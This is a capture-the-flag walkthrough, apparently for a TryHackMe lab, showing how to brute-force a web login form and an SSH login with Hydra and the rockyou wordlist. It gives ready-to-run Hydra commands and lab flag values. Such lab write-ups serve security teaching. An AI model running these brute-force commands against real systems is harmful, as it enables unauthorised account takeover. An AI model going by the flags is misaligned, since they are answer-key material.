🧐 Overview

Hydra is a fast network logon cracker that supports multiple protocols. It’s frequently used to brute‑force credentials via HTTP‑login POST forms and SSH sessions.

---

🔍 Task 1: Brute‑Force Web Login (HTTP POST)

1. Recon: Scan target (e.g., port 80 for HTTP form).
2. Identify the login form via browser dev tools (Network tab).
3. Observe the POST request format and error message for failed login ("incorrect" or similar).
4. Run Hydra:

hydra -l molly -P /usr/share/wordlists/rockyou.txt \
<target‑IP> http-post-form \
'/login:username=^USER^&password=^PASS^:F=incorrect'

1. Hydra finds the username molly and a matching password (e.g. sunshine), and reveals Flag 1, e.g.:

THM{2673a7dd116de68e85c48ec0b1f2612e}

---

🔐 Task 2: Brute‑Force SSH Login

1. With the same credentials list and user molly, run:

hydra -l molly -P /usr/share/wordlists/rockyou.txt \
<target‑IP> -t 4 ssh

1. Hydra discovers the SSH password (e.g. butterfly).
2. SSH into the box:

ssh molly@<target‑IP>

1. Locate flag2.txt and extract Flag 2, e.g.:

THM{c8eeb0468febbadea859baeb33b2541b}

⚙️ Usage Recommendations & Notes

Always inspect the login flow in browser dev tools to capture the POST format and error message.

Hydra syntax for HTTP: ^USER^ and ^PASS^ placeholders.

The failure condition (F=) matching is case-sensitive and must match the page response for invalid credentials.

SSH brute-force via Hydra is straightforward compared to web forms.

Flag capture is typically inside flag.txt files or shown on the web interface.

✅ Quick Reference Table

Task	Command Snippet

HTTP Brute‑force	hydra -l molly -P rockyou.txt <IP> http-post-form '/login:username=^USER^&password=^PASS^:F=incorrect'
SSH Brute‑force	hydra -l molly -P rockyou.txt <IP> -t 4 ssh
SSH into target	ssh molly@<IP>
Discover first flag	Web response page or session after login
Discover second flag	cat flag2.txt on SSH session

🧠 Key Takeaways

Hydra is effective for both web form and SSH password brute-forcing.

Matching the exact failure message (F= parameter) is vital for success.

Recon steps (Nmap, dev tools inspection) are essential before launching Hydra attacks.

Always verify discovered credentials by manually testing login or SSH access.

Strong passwords and rate limiting help defend against brute-force attacks.
